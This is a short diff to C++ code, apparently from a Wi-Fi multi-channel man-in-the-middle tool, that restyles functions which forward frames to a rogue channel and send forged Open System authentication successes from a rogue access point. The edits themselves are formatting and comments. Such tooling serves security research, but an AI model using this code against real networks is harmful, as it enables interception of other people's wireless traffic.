@@ -12,7 +12,9 @@ using namespace std;
 using namespace chrono;
 using namespace Tins;
 
-void McMitm::send_to_rogue(PDU &pdu) const{ sock_rogue->send(pdu, netconfig.rogue_channel); }
+void McMitm::send_to_rogue(PDU &pdu) const {
+	sock_rogue->send(pdu, netconfig.rogue_channel);
+}
 
 void McMitm::send_to_rogue(const vector<uint8_t> &raw) const{
 	sock_rogue->send(raw, netconfig.rogue_channel);
@@ -44,9 +46,9 @@ PProcess McMitm::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11){
 	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()){
 		if(auth->auth_algorithm() == 0 && auth->auth_seq_number() == 1){
 			// Open System Auth seq=1 ->  seq=2 success
-			Dot11Authentication resp(addr2, ap.get(SK::mac));// client <- rogue AP
+			Dot11Authentication resp(addr2, ap.get(SK::mac)); // client <- rogue AP
 			resp.addr3(ap.get(SK::mac));
-			resp.auth_seq_number(2);
+			resp.auth_seq_number(2); // auth response
 			resp.auth_algorithm(0); // Open System
 			resp.status_code(0); // success
 
